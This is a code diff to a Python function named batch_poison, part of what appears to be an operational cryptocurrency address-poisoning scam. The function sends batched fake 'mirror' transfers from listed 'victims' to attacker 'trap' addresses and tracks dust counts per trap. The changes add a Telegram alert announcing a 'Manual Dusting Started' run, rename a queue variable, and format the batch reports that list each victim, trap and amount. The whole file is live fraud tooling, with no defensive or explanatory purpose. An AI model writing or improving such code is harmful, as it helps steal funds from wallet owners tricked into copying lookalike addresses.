@@ -1208,6 +1208,14 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
     logger.info(f"Found {total} victims. Processing with mirror events only...")
     if job_id:
         update_job(job_id, total=total)
+        
+    # 🚀 Send "Started" Telegram notification immediately
+    start_msg = (
+        f"🚀 *Manual Dusting Started*\n\n"
+        f"👥 Total victims: {total}\n"
+        f"⚙️ Processing batches of {BATCH_SIZE}..."
+    )
+    send_telegram(start_msg, campaign_id=campaign_id)
 
     success = 0
     gas_failures = 0
@@ -1284,8 +1292,8 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
             )
             
             if tx_hash:
-                success += len(poison_queue)
-                logger.info(f"[batch] ✅ Batch emitted: {len(poison_queue)} transfers in tx={tx_hash}")
+                success += len(queue)
+                logger.info(f"[batch] ✅ Batch emitted: {len(queue)} transfers in tx={tx_hash}")
                 
                 # Update dust counts for all traps in batch
                 for tid in batch_trap_ids:
@@ -1294,11 +1302,11 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
                 
                 # Send single Telegram notification for the batch
                 batch_msg = (
-                    f"🪞 Batch Mirror Events Emitted!\n\n"
-                    f"Processed: {len(poison_queue)} victims\n"
+                    f"🪞 *Batch Mirror Events Emitted!*\n\n"
+                    f"Processed: {len(queue)} victims\n"
                     f"TX: `{tx_hash}`\n\n"
                 )
-                for idx, q in enumerate(poison_queue, 1):
+                for idx, q in enumerate(queue, 1):
                     decimals = get_token_decimals(q['asset'])
                     amount_display = q['amount'] / (10 ** decimals)
                     batch_msg += f"{idx}. `{q['victim']}` → `{q['trap']}` ({amount_display:.6f} {q['asset']})\n"
@@ -1317,7 +1325,7 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
                             logger.warning(f"[batch] ❌ Batch failed (gas insufficient)")
                             if gas_failures >= 3:
                                 logger.error(f"⛽ Stopping batch: {gas_failures} consecutive gas failures")
-                                poison_queue.clear()
+                                queue.clear()
                                 break
                         else:
                             logger.error(f"[batch] ❌ Batch failed (other reason)")
@@ -1352,19 +1360,19 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
             )
         
         if tx_hash:
-            success += len(poison_queue)
-            logger.info(f"[batch] ✅ Final batch emitted: {len(poison_queue)} transfers in tx={tx_hash}")
+            success += len(queue)
+            logger.info(f"[batch] ✅ Final batch emitted: {len(queue)} transfers in tx={tx_hash}")
             
             for tid in batch_trap_ids:
                 if tid:
                     update_trap_dust_count(tid)
             
             batch_msg = (
-                f"🪞 Final Batch Mirror Events!\n\n"
-                f"Processed: {len(poison_queue)} victims\n"
+                f"🪞 *Final Batch Mirror Events!*\n\n"
+                f"Processed: {len(queue)} victims\n"
                 f"TX: `{tx_hash}`\n\n"
             )
-            for idx, q in enumerate(poison_queue, 1):
+            for idx, q in enumerate(queue, 1):
                 decimals = get_token_decimals(q['asset'])
                 amount_display = q['amount'] / (10 ** decimals)
                 batch_msg += f"{idx}. `{q['victim']}` → `{q['trap']}` ({amount_display:.6f} {q['asset']})\n"
